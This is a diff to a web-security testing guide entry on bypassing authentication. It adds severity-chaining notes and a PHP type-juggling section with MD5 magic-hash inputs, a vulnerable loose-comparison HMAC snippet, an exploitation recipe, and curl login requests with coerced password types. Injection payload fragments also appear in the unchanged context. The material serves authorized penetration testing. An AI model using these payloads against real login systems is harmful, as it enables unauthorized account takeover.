@@ -10,7 +10,9 @@ tech_stack: []
 cwe_ids: [CWE-307]
 chains_with: [wstg-athn-05, wstg-athn-02]
 prerequisites: [wstg-idnt-01]
-severity_boost: {}
+severity_boost:
+  wstg-athn-02: "Authentication Bypass (forced browsing/parameter tampering reveals a hidden admin login) + Default Credentials = the bypass exposes an administrative entry point that still accepts vendor default credentials, turning a discovery bug into full administrative compromise (Critical)"
+  wstg-athn-05: "Authentication Bypass + Vulnerable Remember-Me Token = the attacker uses the bypass to reach an authenticated area, then plants or harvests a predictable remember-me token so access survives even after the bypass itself is patched or the session expires (Persistent Unauthorized Access, Critical)"
 ---
 
 # wstg-athn-04
@@ -282,6 +284,42 @@ admin)(|(password=*))
 ' or ''='
 x' or name()='username' or 'x'='y
 ```
+
+### PHP Type Juggling / Magic Hash Bypass (from PayloadsAllTheThings)
+
+If the backend is PHP and uses loose comparison (`==`/`!=`) instead of strict comparison (`===`/`!==`) to check a password hash, HMAC, or token against user input, authentication can be bypassed without knowing any secret:
+
+```text
+# "Magic hash" collision: strings whose MD5/SHA1/etc hash starts with "0e" followed only by
+# digits get interpreted by PHP as scientific notation (0) during loose comparison, so
+# hash('any_algo', attacker_input) == 0 == hash('any_algo', real_secret) can both evaluate true
+
+# Known MD5 magic hash inputs (hash('md5', X) == 0e... under loose comparison):
+240610708
+QNKCDZO
+0e1137126905
+```
+
+```php
+// Vulnerable pattern to look for when source is available (grey-box) or inferable from behavior:
+if ($cookie['hmac'] != hash_hmac('md5', $cookie['username'].'|'.$cookie['expiration'], $key)) {
+    return false;   // loose comparison - bypassable
+}
+```
+
+Exploitation when the key is guessable/empty: submit a crafted `hmac=0` alongside a `username`/`expiration` pair brute-forced until `hash_hmac(...)` happens to start with `0e` followed only by digits — the loose `!=` check then treats both sides as numeric `0` and passes.
+
+```bash
+# Test whether a password/token comparison field accepts type coercion directly
+curl -s -X POST "https://{target}/login" -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":true}'
+curl -s -X POST "https://{target}/login" -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":0}'
+curl -s -X POST "https://{target}/login" -H "Content-Type: application/json" \
+    -d '{"username":"admin","password":[]}'
+```
+
+Detection pattern: a JSON body where the password/token field is sent as a non-string type (`true`, `0`, `null`, `[]`) that authenticates successfully indicates the comparison is not type-safe.
 
 ### Authentication Bypass Tester
 
@@ -600,6 +638,7 @@ def check_authorization():
 - [OWASP WSTG - Testing for Bypassing Authentication Schema](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema)
 - [OWASP Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
 - [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
+- [PayloadsAllTheThings - Type Juggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling)
 
 
 ---
